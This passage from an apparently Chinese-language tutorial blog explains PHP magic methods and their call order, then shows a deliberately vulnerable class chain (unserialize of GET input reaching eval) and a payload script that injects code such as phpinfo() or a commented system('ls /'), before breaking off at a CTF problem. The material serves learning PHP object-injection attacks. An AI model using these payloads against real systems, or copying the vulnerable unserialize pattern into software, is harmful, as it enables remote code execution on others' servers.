&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$resourceHandler</span> = <span class="keyword">new</span> <span class="title class_">ResourceHandler</span>();</span><br><span class="line"><span class="variable">$serializedResource</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$resourceHandler</span>);</span><br><span class="line"><span class="variable">$deserializedResource</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedResource</span>);</span><br></pre></td></tr></table></figure>
<p>在这个例子中，当对象被反序列化时，<code>__wakeup()</code> 方法会被调用，重新打开文件资源</p>
</li>
</ul>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h4><ul>
<li><p>当创建一个对象时，它会被自动调用</p>
</li>
<li><p>构造方法用于在创建对象时初始化对象的属性等操作。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"><span class="comment">//$person -&gt; name = &quot;Alice&quot;;</span></span><br></pre></td></tr></table></figure>
<p>在上面的例子中，当创建 <code>Person</code> 类的实例 <code>$person</code> 时，<code>__construct()</code> 方法被调用，将传入的参数 <code>&quot;Alice&quot;</code> 赋值给对象的 <code>$name</code> 属性</p>
</li>
</ul>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h4><ul>
<li><p>这是 PHP 面向对象编程中的析构方法。当对象被销毁时，它会被自动调用</p>
</li>
<li><p>析构方法通常用于执行清理工作，如关闭数据库连接、释放资源等。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$connection</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;database&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$this</span>-&gt;connection);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">DatabaseConnection</span>();</span><br></pre></td></tr></table></figure>
<p>在这个例子中，当 <code>$db</code> 对象的生命周期结束（如脚本执行完毕或者对象被显式销毁）时，<code>__destruct()</code> 方法会被调用，关闭数据库连接</p>
</li>
</ul>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><ul>
<li><p>这个魔术方法用于在对象被序列化时执行一些操作。当使用 <code>serialize()</code> 函数来序列化对象时，<code>__sleep()</code> 会被自动调用</p>
</li>
<li><p>它通常用于清理对象，如关闭对象中的资源句柄或者指定对象中哪些属性可以被序列化。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResourceHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$resource</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;resource = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;resource);</span><br><span class="line">        <span class="comment">// 可以指定哪些属性可以被序列化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$resourceHandler</span> = <span class="keyword">new</span> <span class="title class_">ResourceHandler</span>();</span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$resourceHandler</span>);</span><br></pre></td></tr></table></figure>
<p>在这个例子中，当对 <code>ResourceHandler</code> 对象进行序列化时，<code>__sleep()</code> 方法被调用，先关闭资源文件句柄</p>
</li>
</ul>
<h4 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get()  &amp; __set()"></a><code>__get()</code>  &amp; <code>__set()</code></h4><ul>
<li><p>在 PHP 面向对象编程中，<code>get()</code> 和 <code>set()</code> 通常用于封装类的属性，提供对属性的受控访问</p>
</li>
<li><p><strong><code>set()</code> 方法</strong>：用于设置对象属性的值。它可以在设置属性值时添加额外的逻辑，如验证数据的有效性等。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$price</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPrice</span>(<span class="params"><span class="variable">$price</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$price</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;price = <span class="variable">$price</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Price cannot be negative&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$product</span> = <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line"><span class="variable">$product</span> - &gt; <span class="title function_ invoke__">setPrice</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>在这个例子中，<code>setPrice()</code> 方法用于设置产品价格，同时检查价格是否为负数，如果是负数则抛出异常。</p>
</li>
</ul>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>调用一个不存在的方法时，会触发 <code>__call()</code> 魔法方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你调用了不存在的方法: <span class="subst">$name</span>\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;传递的参数是: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">someNonExistentMethod</span>(<span class="string">&#x27;参数1&#x27;</span>, <span class="string">&#x27;参数2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#你调用了不存在的方法: someNonExistentMethod</span></span><br><span class="line"><span class="comment">#传递的参数是: 参数1, 参数2</span></span><br></pre></td></tr></table></figure>
<p>假设我们有一个类 <code>Example</code>，其中定义了 <code>__call()</code> 方法，没有定义 <code>someNonExistentMethod()</code>，直接调用 <code>someNonExistentMethod()</code> 就会触发 <code>__call()</code></p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><ul>
<li>当一个对象被当作函数调用时，<code>__invoke()</code> 方法会被自动调用。这使得对象可以像函数一样被调用，提供了更多的灵活性，可以创建可调用的对象，这样的对象在某些场景下可以作为回调函数等使用。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvokableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">InvokableClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 像调用函数一样调用对象</span></span><br><span class="line"><span class="variable">$obj</span>(<span class="string">&quot;PHP&quot;</span>);  <span class="comment">// 输出 &quot;Hello, PHP!&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>在 PHP 中，<code>__toString()</code> 是一个魔术方法，用于定义对象被当作字符串使用时的返回值。当你尝试将一个对象转换为字符串（例如，直接将对象与字符串拼接，或者用 <code>echo</code> 输出对象）时，PHP 会自动调用该对象的 <code>__toString()</code> 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>; <span class="comment">// 输出: Hello, World!</span></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(1)echo ($obj) / print($obj) 打印时会触发</span><br><span class="line"></span><br><span class="line">(2)反序列化对象与字符串连接时</span><br><span class="line"></span><br><span class="line">(3)反序列化对象参与格式化字符串时</span><br><span class="line"></span><br><span class="line">(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</span><br><span class="line"></span><br><span class="line">(5)反序列化对象参与格式化SQL语句，绑定参数时</span><br><span class="line"></span><br><span class="line">(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</span><br><span class="line"></span><br><span class="line">(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</span><br><span class="line"></span><br><span class="line">(8)反序列化的对象作为 class_exists() 的参数的时候</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(callable $callback, array $param_array): mixed</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数</strong> ：<ul>
<li><code>$callback</code> ：要调用的回调函数，可以是函数名、类的方法、静态类方法等</li>
<li><code>$param_array</code> ：一个数组，包含要传递给回调函数的参数</li>
</ul>
</li>
<li><strong>返回值</strong> ：返回回调函数的返回值</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Name: <span class="subst">$name</span>, Age: <span class="subst">$age</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$params</span> = [<span class="string">&quot;Alice&quot;</span>, <span class="number">20</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$obj</span>, <span class="string">&#x27;test&#x27;</span>], <span class="variable">$params</span>);</span><br><span class="line"><span class="comment">// 输出：Name: Alice, Age: 20</span></span><br></pre></td></tr></table></figure>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p><code>create_function()</code> 是 PHP 中的一个函数，用于创建匿名函数（也称为 lambda 函数）。这个函数在 PHP 5.3.0 引入了匿名函数语法之前非常有用，但现在基本已被弃用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数</strong> ：<ul>
<li><code>$args</code> ：一个包含函数参数列表的字符串，参数之间用逗号分隔。例如：<code>&quot;$arg1, $arg2&quot;</code></li>
<li><code>$code</code> ：一个包含函数主体代码的字符串</li>
</ul>
</li>
<li><strong>返回值</strong> ：返回唯一的一个标识符（作为字符串），这个标识符可以用来调用所创建的函数</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个简单的函数，将字符串转换为大写</span></span><br><span class="line"><span class="variable">$strToUpper</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$str&#x27;</span>, <span class="string">&#x27;return strtoupper($str);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$strToUpper</span>(<span class="string">&quot;hello world&quot;</span>); <span class="comment">// 输出：HELLO WORLD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 array_map 中使用</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>];</span><br><span class="line"><span class="variable">$upperArray</span> = <span class="title function_ invoke__">array_map</span>(<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$item&#x27;</span>, <span class="string">&#x27;return strtoupper($item);&#x27;</span>), <span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$upperArray</span>);</span><br><span class="line"><span class="comment">// 输出：Array ( [0] =&gt; APPLE [1] =&gt; BANANA [2] =&gt; CHERRY )</span></span><br></pre></td></tr></table></figure>
<h4 id="空对象stdClass"><a href="#空对象stdClass" class="headerlink" title="空对象stdClass()"></a>空对象stdClass()</h4><p><code>stdClass</code> —— PHP 的“万能空对象”</p>
<p>当我们需要 <strong>“随便一个对象”</strong> 来占位、触发 <code>__destruct</code>/<code>__wakeup</code> 等，但又不需要它有任何方法时，用 <code>stdClass</code> 最方便</p>
<hr>
<h3 id="调用顺序"><a href="#调用顺序" class="headerlink" title="调用顺序"></a>调用顺序</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pompom</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&quot;pompom&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;__construct&quot;</span>;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;__sleep&quot;</span>;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	 <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;__wakeup&quot;</span>;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pompom_old</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pompom</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$pompom_old</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize-3.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$pompom_new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$pompom_new</span>);</span><br></pre></td></tr></table></figure>
<p>输出结果应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct</span><br><span class="line">__sleep</span><br><span class="line">__wakeup</span><br><span class="line">__toString</span><br><span class="line">__destruct </span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure>
<p>两个__destruct()说明存在两个对象，一个是实例化时候创建的，一个是反序列化后生成的对象</p>
<hr>
<h3 id="利用魔法方法进行攻击"><a href="#利用魔法方法进行攻击" class="headerlink" title="利用魔法方法进行攻击"></a>利用魔法方法进行攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pure</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Pure</span> = <span class="string">&quot;i am Pure&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">L</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里可以看到<code>unserialize()</code>是可控的，就可以利用反序列化，然后看类，第一个类触发时自动调用<code>L()</code>这个类，然后销毁时自动调用<code>Evil()</code>，然后我们看Evil这边有个<code>eval()</code>函数，里面执行的是<code>test2</code>，那我们在构造序列化的时候就可以给这个$test2赋值为恶意代码，然后Evil()触发的时候就会执行我这个恶意代码</p>
<p><strong>Payload：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pure</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Pure</span> = <span class="string">&quot;i am Pure&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&quot;phpinfo()&quot;</span>; <span class="comment">// system(&#x27;ls /&#x27;);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pure</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="php一般反序列化"><a href="#php一般反序列化" class="headerlink" title="php一般反序列化"></a>php一般反序列化</h3><h4 id="SWPUCTF-2021-新生赛-ez-unserialize-NSSCTF-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize-NSSCTF-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize | NSSCTF ez_unserialize"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/426">[SWPUCTF 2021 新生赛]ez_unserialize | NSSCTF</a> ez_unserialize</h4><p>源码：</p>
